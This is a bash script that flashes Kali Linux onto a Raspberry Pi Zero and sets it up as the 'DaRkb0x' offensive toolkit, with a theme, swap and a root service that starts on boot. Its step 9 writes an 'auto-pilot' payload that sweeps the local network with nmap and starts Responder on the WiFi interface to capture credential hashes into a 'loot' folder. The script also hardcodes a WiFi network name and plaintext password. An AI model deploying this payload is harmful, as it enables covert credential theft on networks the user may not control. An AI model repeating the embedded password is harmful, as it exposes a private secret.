#!/bin/bash
set -e

# ==============================================================================
# DaRkb0x Master Setup Script
# ==============================================================================
# This script flashes Kali Linux and applies ALL custom DaRkb0x patches.
# ==============================================================================

IMG="/home/sinxneo/projects/pizero/kali-rpi-zero.img.xz"
DEV="/dev/sda"
MNT_BOOT="/mnt/insomnia_boot"
MNT_ROOT="/mnt/insomnia_root"
PI_HOME="/home/kali/DaRkb0x"

if [ "$EUID" -ne 0 ]; then
  echo "Please run this script with sudo."
  exit 1
fi

echo "[1/10] Unmounting existing partitions..."
umount ${DEV}* 2>/dev/null || true

echo "[2/10] Flashing Kali Linux image (be patient)..."
xzcat "$IMG" | dd of="$DEV" bs=4M status=progress conv=fsync

echo "[3/10] Mounting partitions..."
sync && sleep 5
partprobe "$DEV"
mkdir -p "$MNT_BOOT" "$MNT_ROOT"
mount ${DEV}1 "$MNT_BOOT"
mount ${DEV}2 "$MNT_ROOT"

echo "[4/10] Enabling Hardware & Network..."
touch "$MNT_BOOT/ssh"
echo "dtparam=spi=on" >> "$MNT_BOOT/config.txt"
# Remove any accidental gadget mode settings
sed -i 's/modules-load=dwc2,g_ether//g' "$MNT_BOOT/cmdline.txt"
sed -i '/dtoverlay=dwc2/d' "$MNT_BOOT/config.txt"

# WiFi config
cat << 'EOF' > "$MNT_BOOT/wpa_supplicant.conf"
ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev
update_config=1
country=US
network={
    ssid="WentzATTNetwork"
    psk="Mater4<34ever"
}
EOF

echo "[5/10] Applying DaRkb0x Branding & Theme..."
# Copy all files
mkdir -p "$MNT_ROOT$PI_HOME"
rsync -av --exclude='*.img.xz' /home/sinxneo/projects/pizero/ /MNT_ROOT$PI_HOME/ || rsync -av --exclude='*.img.xz' /home/sinxneo/projects/pizero/DaRkb0x/ "$MNT_ROOT$PI_HOME/"
cp /home/sinxneo/projects/pizero/logo.bmp "$MNT_ROOT$PI_HOME/img/logo.bmp"

# Apply Cyberpunk Neon Colors
sed -i 's/"BACKGROUND": "#000000"/"BACKGROUND": "#111111"/' "$MNT_ROOT$PI_HOME/gui_conf.json"
sed -i 's/"BORDER": "#05ff00"/"BORDER": "#ff00ff"/' "$MNT_ROOT$PI_HOME/gui_conf.json"
sed -i 's/"GAMEPAD": "#141494"/"GAMEPAD": "#00ffff"/' "$MNT_ROOT$PI_HOME/gui_conf.json"
sed -i 's/"SELECTED_TEXT": "#00ff55"/"SELECTED_TEXT": "#000000"/' "$MNT_ROOT$PI_HOME/gui_conf.json"
sed -i 's/"SELECTED_TEXT_BACKGROUND": "#2d0fff"/"SELECTED_TEXT_BACKGROUND": "#00ffff"/' "$MNT_ROOT$PI_HOME/gui_conf.json"
sed -i 's/"TEXT": "#05ff00"/"TEXT": "#ff00ff"/' "$MNT_ROOT$PI_HOME/gui_conf.json"

echo "[6/10] Injecting Performance Fixes (SWAP)..."
# Create 1GB swap file on the Pi's rootfs to prevent freezing
fallocate -l 1G "$MNT_ROOT/swapfile"
chmod 600 "$MNT_ROOT/swapfile"
# Note: we can't mkswap here easily as it depends on host arch, 
# but we can add it to fstab
echo "/swapfile none swap sw 0 0" >> "$MNT_ROOT/etc/fstab"

echo "[7/10] Applying UI Categorization & Button Mapping..."
# Use the fixed file we generated or apply patches here.
# Since we have the fixed file locally, let's just use it.
if [ -f "/home/sinxneo/projects/pizero/darkbox_fixed_v2.py" ]; then
    cp "/home/sinxneo/projects/pizero/darkbox_fixed_v2.py" "$MNT_ROOT$PI_HOME/darkbox.py"
fi

# Ensure all hardcoded paths are correct for the new user home
sed -i 's|/root/DaRkb0x/|/home/kali/DaRkb0x/|g' "$MNT_ROOT$PI_HOME/darkbox.py"
sed -i 's|/root/DaRkb0x/|/home/kali/DaRkb0x/|g' "$MNT_ROOT$PI_HOME/gui_conf.json"

echo "[8/10] Setting up systemd service..."
cat << 'EOF' > "$MNT_ROOT/etc/systemd/system/darkbox.service"
[Unit]
Description=DaRkb0x Toolkit
After=network.target

[Service]
ExecStartPre=/sbin/mkswap /swapfile
ExecStartPre=/sbin/swapon /swapfile
ExecStart=/usr/bin/python3 /home/kali/DaRkb0x/darkbox.py
WorkingDirectory=/home/kali/DaRkb0x
User=root
Restart=always

[Install]
WantedBy=multi-user.target
EOF

echo "[9/10] Creating Auto-Pilot Payload..."
mkdir -p "$MNT_ROOT$PI_HOME/payloads/insomnia_suite"
cat << 'EOF' > "$MNT_ROOT$PI_HOME/payloads/insomnia_suite/insomnia_auto.py"
#!/usr/bin/env python3
import time, os, subprocess
from datetime import datetime
LOOT_DIR = "/home/kali/DaRkb0x/loot/insomnia"
LOG_FILE = os.path.join(LOOT_DIR, "insomnia_auto.log")
def log(msg):
    os.makedirs(LOOT_DIR, exist_ok=True)
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, "a") as f: f.write(f"[{timestamp}] {msg}\n")
def main():
    log("=== DaRkb0x AUTO-PILOT INITIATED ===")
    log("[*] Scanning local network...")
    subprocess.run(["nmap", "-sn", "192.168.1.0/24", "-oN", os.path.join(LOOT_DIR, "nmap_sweep.txt")], stdout=subprocess.DEVNULL)
    log("[+] Scan complete. Starting background listener...")
    subprocess.Popen(["sudo", "python3", "/home/kali/DaRkb0x/Responder/Responder.py", "-I", "wlan0", "-w", "-F"], stdout=subprocess.DEVNULL)
if __name__ == "__main__": main()
EOF
chmod +x "$MNT_ROOT$PI_HOME/payloads/insomnia_suite/insomnia_auto.py"

echo "[10/10] Finalizing..."
chown -R 1000:1000 "$MNT_ROOT$PI_HOME"
umount "$MNT_BOOT" "$MNT_ROOT"
echo "=========================================================="
echo "SUCCESS! DaRkb0x is ready for battle."
echo "1. Insert SD card into Pi."
echo "2. Boot it up. It will be slightly slow on FIRST boot."
echo "3. ALL buttons (K1-K3) and Joystick are mapped."
echo "4. Freezing should be fixed by the 1GB swap file."
echo "=========================================================="
